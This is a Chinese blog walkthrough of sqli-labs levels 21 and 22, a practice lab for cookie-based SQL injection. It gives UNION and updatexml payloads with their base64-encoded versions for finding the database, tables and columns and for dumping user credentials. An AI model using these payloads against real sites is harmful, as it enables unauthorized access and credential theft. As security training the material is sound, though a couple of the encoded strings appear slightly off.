# 原创
：  （手工）【sqli-labs21-22】cookie加密注入：payload、利用过程

# （手工）【sqli-labs21-22】cookie加密注入：payload、利用过程

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less21（Cookie injection -base64 encoded-single quotes and parenthesis）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（Cookie注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：判断字段数](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[二、Less22（Cookie injection -base64 encoded-double quotes ）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（Cookie注入-双引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

---


> 
<h2>推荐：</h2>
[【SQL注入】cookie注入：原理、步骤、示例<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125685994?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165751511116782248596618%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165751511116782248596618&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125685994-null-null.185%5Ev2%5Econtrol&amp;utm_term=cookie&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125685994?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165751511116782248596618%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165751511116782248596618&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-125685994-null-null.185%5Ev2%5Econtrol&amp;utm_term=cookie&amp;spm=1018.2226.3001.4450)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 二、Less21（Cookie injection -base64 encoded-single quotes and parenthesis）

> 
<h3>2.1、简介：（Cookie注入）</h3>
请求方法：POST
方法：Cookie注入报错回显
可以使用burp
或者浏览器插件cookie管理器


> 
<h3>2.2、第一步：注入点测试</h3>
输入框测试都不存在注入点


 登录进去以后
**<strong>YWRtaW4=**</strong>
一看就是使用了base64加密





> 
<h3> 2.3、第二步：分析过滤</h3>
在输入框中尝试都未报错
对输入框都进行了过滤
接下来：
方法一：获得源码，寻找过滤不严谨的地方
方法二：寻找其他注入点（Header）
<hr/>
我这里使用cookie编辑器


尝试对cookie进行注入
例如：uname=Dumb’
Dumb’的base64加密后是RHVtcCc=
修改value（值）----&gt;报存-----&gt;刷新页面

cookie值改为预定值
且存在回显报错
<img alt="" height="864" src="https://img-blog.csdnimg.cn/ac6ab40e63ba4ae4acc3ce98b1564a28.png" width="1200"/>说明存在注入点（单引号闭合）



> 
<h3>2.4、第三步：判断字段数</h3>
Dum') union select 1, 2, 3#
base64加密后
RHVtJykgdW5pb24gc2VsZWN0IDEsIDIsIDMj
回显正常

Dum') union select 1, 2, 3,4#
base64加密后
RHVtJykgdW5pb24gc2VsZWN0IDEsIDIsIDMsNCMKCg==
刷新后退出了




> 
<h3>2.5、第四步：暴库</h3>
-admin') union select 1,2,database()#
base64加密
LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==



> 
<h3>2.6、第五步：爆表名</h3>
-admin') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'#
base64加密后
LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIw==

 



> 
<h3>2.7、第六步：爆字段</h3>
uname=' union select 1,2,(updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1))#
<img alt="" height="877" src="https://img-blog.csdnimg.cn/d40b58765d8a4a579fc3a61bb7a070f4.png" width="1200"/>​
-admin') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
base64加密后
LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw==

 


> 
<h3>2.8、第七步：爆数据</h3>
1') union select 1,2,group_concat(concat_ws('-',id,username,password)) from users# 
base64加密后
MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbmNhdF93cygnLScsaWQsdXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzIw==



---


---


## 二、Less22（Cookie injection -base64 encoded-double quotes ）

> 
<h3>2.1、简介：（Cookie注入-双引号）</h3>
请求方法：POST
方法：Cookie注入报错回显
可以使用burp
或者浏览器插件cookie管理器


> 
注入方法和Less21一样

